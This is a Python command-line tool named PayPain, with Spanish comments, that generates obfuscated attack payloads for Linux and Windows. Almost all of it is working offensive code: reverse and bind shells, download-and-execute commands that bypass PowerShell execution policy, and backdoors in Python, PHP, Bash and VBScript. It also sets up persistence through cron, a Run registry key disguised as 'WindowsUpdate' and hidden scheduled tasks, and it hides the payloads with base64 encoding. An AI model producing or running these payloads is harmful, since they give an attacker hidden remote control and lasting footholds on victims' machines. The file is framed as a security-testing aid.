import argparse
import base64
import sys
import random
import string
from colorama import Fore, Style, init
import pyfiglet


# Iniciar colorama para colores en consola
init(autoreset=True)

# Diccionario de payloads disponibles por SO
PAYLOADS_DISPONIBLES = {
    "linux": ["reverse_shell", "bind_shell", "download_execute", "python_backdoor", "php_backdoor", "bash_backdoor", "cron_persistence"],
    "windows": ["reverse_shell", "bind_shell", "download_execute", "powershell_backdoor", "vbs_backdoor", "registry_persistence", "wmi_persistence"]
}

def print_banner():
    # Banner
    try:
        fonts = ["slant", "standard", "big"]
        banner = None
        
        for font in fonts:
            try:
                banner = pyfiglet.figlet_format("PayPain", font=font)
                if banner:
                    break
            except Exception:
                continue
                
        if not banner:
            # Notación de cadena raw 'r' para evitar problemas de escape
            banner = r"""
 _____              _____       _       
|  __ \            |  __ \     (_)      
| |__) |__ _ _   _ | |__) |__ _ _ _ __  
|  ___/ _` | | | ||  ___/ _` | | | '_ \ 
| |  | (_| | |_| || |  | (_| | | | | | |
|_|   \__,_|\__, ||_|   \__,_|_|_|_| |_|
             __/ |                      
            |___/                       
"""
            
        print(Fore.GREEN + banner + Style.RESET_ALL)
        print(Fore.GREEN + "=" * 100 + Style.RESET_ALL)
        print(Fore.YELLOW + "Versión: 1.0" + Style.RESET_ALL)
        print(Fore.YELLOW + "Descripción: Genera payloads ofuscados para pruebas de seguridad." + Style.RESET_ALL)
        print(Fore.GREEN + "=" * 100 + Style.RESET_ALL)
        print("\n")
    except Exception as e:
        print(Fore.GREEN + "========== PayPain v1.0 ==========" + Style.RESET_ALL)
        print(Fore.YELLOW + "Generador de payloads ofuscados para pruebas de seguridad." + Style.RESET_ALL)
        print(Fore.GREEN + "=" * 40 + Style.RESET_ALL)
        print("\n")


def generar_nombre_variable_aleatorio():
    # Genera un nombre de variable aleatorio para ofuscación
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(8))


def generar_payload_basico(tipo, so, ip, puerto, archivo_url=None):
    # Genera un payload básico según el tipo y el SO
    if tipo == "reverse_shell":
        if so == "linux":
            return f"bash -i >& /dev/tcp/{ip}/{puerto} 0>&1"
        elif so == "windows":
            script = f"""
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{puerto});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
            return script.strip()
            
    elif tipo == "bind_shell":
        if so == "linux":
            return f"""
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.bind(("0.0.0.0",{puerto}));
s.listen(1);
conn,addr=s.accept();
while True:
    cmd=conn.recv(1024).decode();
    if cmd=="exit": break;
    output=subprocess.getoutput(cmd);
    conn.send(output.encode());
s.close()'
"""
        elif so == "windows":
            script = f"""
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{puerto});
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close();
$listener.Stop()
"""
            return script.strip()
            
    elif tipo == "download_execute":
        if not archivo_url:
            raise ValueError("Se requiere la URL del archivo para el payload download_execute")
            
        if so == "linux":
            return f"""
wget -q {archivo_url} -O /tmp/.payload
chmod +x /tmp/.payload
/tmp/.payload
rm /tmp/.payload
"""
        elif so == "windows":
            var_payload = generar_nombre_variable_aleatorio()
            var_outfile = generar_nombre_variable_aleatorio()
            script = f"""
$wc = New-Object System.Net.WebClient
${var_payload} = $wc.DownloadString('{archivo_url}')
${var_outfile} = "$env:TEMP\\{generar_nombre_variable_aleatorio()}.ps1"
Set-Content -Path ${var_outfile} -Value ${var_payload}
powershell.exe -ExecutionPolicy Bypass -File ${var_outfile}
Remove-Item ${var_outfile}
"""
            return script.strip()
            
    elif tipo == "python_backdoor":
        if so == "linux":
            return f"""
import socket,subprocess,os,time,threading,sys
def connect_back():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{ip}',{puerto}))
            break
        except: 
            time.sleep(5)
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
threading.Thread(target=connect_back).start()
"""
        
    elif tipo == "powershell_backdoor":
        if so == "windows":
            var_timer = generar_nombre_variable_aleatorio()
            var_job = generar_nombre_variable_aleatorio()
            script = f"""
$code = {{
    while($true) {{
        try {{
            $client = New-Object System.Net.Sockets.TCPClient('{ip}', {puerto})
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{{0}}
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }}
            $client.Close()
        }} catch {{
            Start-Sleep -s 10
        }}
    }}
}}
Start-Job -ScriptBlock $code | Out-Null
Write-Output "Backdoor started"
"""
            return script.strip()
            
    elif tipo == "php_backdoor":
        if so == "linux":
            return f"""
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {puerto};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    
    if ($pid == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}
    
    if ($pid) {{
        exit(0);  // Parent exits
    }}

    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}

    $daemon = 1;
}} else {{
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    printit("$errstr ($errno)");
    exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
    if (feof($sock)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}

    if (feof($pipes[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {{
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
    if (!$daemon) {{
        print "$string\\n";
    }}
}}
?>
"""
            
    elif tipo == "bash_backdoor":
        if so == "linux":
            return f"""
while true; do
    bash -i >& /dev/tcp/{ip}/{puerto} 0>&1 || sleep 30
done
"""
            
    elif tipo == "vbs_backdoor":
        if so == "windows":
            script = f"""
Set objShell = CreateObject("WScript.Shell")
strCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{puerto});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
            strCommand = strCommand + """"
            objShell.Run strCommand, 0, false
"""
            return script.strip()
            
    elif tipo == "cron_persistence":
        if so == "linux":
            payload = f"bash -i >& /dev/tcp/{ip}/{puerto} 0>&1"
            encoded_payload = base64.b64encode(payload.encode()).decode()
            return f"""
(crontab -l 2>/dev/null; echo "*/5 * * * * echo {encoded_payload} | base64 -d | bash") | crontab -
"""
            
    elif tipo == "registry_persistence":
        if so == "windows":
            payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{puerto});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
            payload_encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            script = f"""
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -EncodedCommand {payload_encoded}" -PropertyType "String" -Force
"""
            return script.strip()
            
    elif tipo == "wmi_persistence":
        if so == "windows":
            var_name = generar_nombre_variable_aleatorio()
            script = f"""
$encoded = '{base64.b64encode(f"powershell.exe -WindowStyle Hidden -EncodedCommand (New-Object System.Net.WebClient).DownloadString('http://{ip}:{puerto}/payload.ps1') | iex".encode('utf-16le')).decode()}'
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encoded"
$T = New-ScheduledTaskTrigger -AtLogOn
$S = New-ScheduledTaskSettingsSet -Hidden
$D = New-ScheduledTask -Action $A -Trigger $T -Settings $S
Register-ScheduledTask '{var_name}' -InputObject $D
"""
            return script.strip()
            
    raise ValueError("Tipo de payload o sistema operativo no soportado")


def ofuscar_payload(payload, so):
    # Ofusca el payload según SO
    if so == "linux":
        # Ofuscación básica con base64
        payload_base64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_base64} | base64 -d | bash"
    elif so == "windows":
        # Ofuscación con PowerShell EncodedCommand
        payload_base64 = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"powershell -WindowStyle Hidden -EncodedCommand {payload_base64}"


def listar_payloads(so):
    # Lista payloads disponibles para SO 
    if so in PAYLOADS_DISPONIBLES:
        print(f"\n{Fore.CYAN}Payloads disponibles para {so}:{Style.RESET_ALL}\n")
        for i, payload in enumerate(PAYLOADS_DISPONIBLES[so], 1):
            # Obtener la descripción del payload
            descripcion = ""
            descripciones = {
                "reverse_shell": {
                    "linux": "Shell inverso que se conecta a una máquina atacante.",
                    "windows": "Shell inverso en PowerShell que se conecta a una máquina atacante."
                },
                "bind_shell": {
                    "linux": "Shell que se vincula a un puerto en la máquina objetivo y espera conexiones.",
                    "windows": "Shell PowerShell que se vincula a un puerto y espera conexiones."
                },
                "download_execute": {
                    "linux": "Descarga y ejecuta un archivo de una URL remota.",
                    "windows": "Descarga y ejecuta un script PowerShell de una URL remota."
                },
                "python_backdoor": {
                    "linux": "Backdoor en Python que establece una conexión con la máquina atacante."
                },
                "powershell_backdoor": {
                    "windows": "Backdoor en PowerShell que intenta conectarse periódicamente a la máquina atacante."
                },
                "php_backdoor": {
                    "linux": "Backdoor en PHP que establece una conexión con la máquina atacante."
                },
                "bash_backdoor": {
                    "linux": "Backdoor en Bash que intenta conectarse periódicamente a la máquina atacante."
                },
                "vbs_backdoor": {
                    "windows": "Backdoor en VBScript que ejecuta un payload PowerShell oculto."
                },
                "cron_persistence": {
                    "linux": "Establece una tarea cron para ejecutar periódicamente un shell inverso."
                },
                "registry_persistence": {
                    "windows": "Establece persistencia mediante el registro de Windows para ejecutar un payload al inicio de sesión."
                },
                "wmi_persistence": {
                    "windows": "Establece persistencia mediante tareas programadas de Windows."
                }
            }
            if payload in descripciones and so in descripciones[payload]:
                descripcion = f" - {descripciones[payload][so]}"
                
            # Asegurar que la descripción completa se imprima correctamente
            print(f"{Fore.GREEN}{i}.{Style.RESET_ALL} {Fore.YELLOW}{payload}{Style.RESET_ALL}")
            if descripcion:
                print(f"   {descripcion}")
            print()
    else:
        print(f"No hay payloads disponibles para el sistema operativo '{so}'.")


def describir_payload(tipo, so):
    # Describe un payload específico
    descripciones = {
        "reverse_shell": {
            "Linux": "shell inverso que se conecta a una máquina atacante.",
            "Windows": "shell inverso en PowerShell que se conecta a una máquina atacante."
        },
        "bind_shell": {
            "Linux": "shell que se vincula a un puerto en la máquina objetivo y espera conexiones.",
            "Windows": "shell PowerShell que se vincula a un puerto y espera conexiones."
        },
        "download_execute": {
            "Linux": "descarga y ejecuta un archivo de una URL remota.",
            "Windows": "descarga y ejecuta un script PowerShell de una URL remota."
        },
        "python_backdoor": {
            "Linux": "backdoor en Python que establece una conexión con la máquina atacante."
        },
        "powershell_backdoor": {
            "Windows": "backdoor en PowerShell que intenta conectarse periódicamente a la máquina atacante."
        },
        "php_backdoor": {
            "Linux": "backdoor en PHP que establece una conexión con la máquina atacante."
        },
        "bash_backdoor": {
            "Linux": "backdoor en Bash que intenta conectarse periódicamente a la máquina atacante."
        },
        "vbs_backdoor": {
            "Windows": "backdoor en VBScript que ejecuta un payload PowerShell oculto."
        },
        "cron_persistence": {
            "Linux": "establece una tarea cron para ejecutar periódicamente un shell inverso."
        },
        "registry_persistence": {
            "Windows": "establece persistencia mediante el registro de Windows para ejecutar un payload al inicio de sesión."
        },
        "wmi_persistence": {
            "Windows": "establece persistencia mediante tareas programadas de Windows."
        }
    }
    
    if tipo in descripciones and so in descripciones[tipo]:
        print(f"{tipo} ({so}): {descripciones[tipo][so]}")
    else:
        print(f"No hay descripción disponible para el payload {tipo} en {so}.")


def mostrar_ayuda():
    # Menú de ayuda
    print_banner()
    print("Uso de la herramienta:")
    print("  -h, --help     : Muestra este mensaje de ayuda")
    print("  -i, --ip       : IP local para la conexión (ej: 192.168.1.100)")
    print("  -p, --puerto   : Puerto local para la conexión (ej: 4444)")
    print("  -t, --tipo     : Tipo de payload (usa -l para listar disponibles. Usar con -s para especificar sistema operativo)")
    print("  -s, --so       : Sistema operativo objetivo (linux o windows)")
    print("  -o, --output   : Archivo de salida para el payload (ej: payload.sh)")
    print("  -l, --list     : Listar payloads disponibles para el sistema operativo")
    print("  -d, --describe : Describir un tipo de payload específico. Usar con -s para especificar sistema operativo")
    print("  -u, --url      : URL para payloads de tipo download_execute")
    print("\nEjemplo: python Paypain.py -i 192.168.1.100 -p 4444 -t reverse_shell -s linux -o payload.sh\n")


def main():
    # Configurar los argumentos con opciones cortas
    parser = argparse.ArgumentParser(
        description="Generador de payloads ofuscados",
        epilog="Ejemplo: python Paypain.py -i 192.168.1.100 -p 4444 -t reverse_shell -s linux -o payload.sh",
        add_help=False  # Desactivar la ayuda automática 
    )
    parser.add_argument("-h", "--help", action="store_true", help="Muestra este mensaje de ayuda")
    parser.add_argument("-i", "--ip", help="IP local para la conexión")
    parser.add_argument("-p", "--puerto", type=int, help="Puerto local para la conexión")
    parser.add_argument("-t", "--tipo", choices=sum(PAYLOADS_DISPONIBLES.values(), []), help="Tipo de payload")
    parser.add_argument("-s", "--so", choices=["linux", "windows"], help="Sistema operativo objetivo")
    parser.add_argument("-o", "--output", help="Archivo de salida para el payload")
    parser.add_argument("-l", "--list", action="store_true", help="Listar payloads disponibles para el sistema operativo")
    parser.add_argument("-d", "--describe", help="Describir un tipo de payload específico")
    parser.add_argument("-u", "--url", help="URL para payloads de tipo download_execute")

    # Primero maneja el argumento -h
    if "-h" in sys.argv or "--help" in sys.argv:
        mostrar_ayuda()
        return

    # Comprobar si no se pasaron argumentos
    if len(sys.argv) == 1:
        mostrar_ayuda()
        return

    args = parser.parse_args()

    try:
        # Si se usa -l, listar payloads y salir
        if args.list:
            if not args.so:
                print("Error: Debe especificar el sistema operativo con -s al usar -l.")
                return
            listar_payloads(args.so)
            return
            
        # Si se usa -d, describir payload y salir
        if args.describe:
            if not args.so:
                print("Error: Debe especificar el sistema operativo con -s al usar -d.")
                return
            describir_payload(args.describe, args.so)
            return

        # Verificar que los parámetros necesarios estén presentes
        if not all([args.ip, args.puerto, args.tipo, args.so, args.output]):
            print("Error: Los parámetros -i, -p, -t, -s, -o son requeridos para generar el payload.")
            return
            
        # Verificar si necesitamos un parámetro adicional 
        if args.tipo == "download_execute" and not args.url:
            print("Error: El payload download_execute requiere especificar una URL con el parámetro -u.")
            return

        # Generar y ofuscar el payload
        payload_basico = generar_payload_basico(args.tipo, args.so, args.ip, args.puerto, args.url)
        payload_ofuscado = ofuscar_payload(payload_basico, args.so)
        
        # Guardar en el archivo de salida
        with open(args.output, "w") as f:
            f.write(payload_ofuscado)
        print(f"Payload generado y guardado en {args.output}")

        # Imprimir el payload en pantalla
        print(Fore.GREEN + "========================================" + Style.RESET_ALL)
        print(Fore.BLUE + payload_ofuscado + Style.RESET_ALL)
        print(Fore.GREEN + "========================================" + Style.RESET_ALL)

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
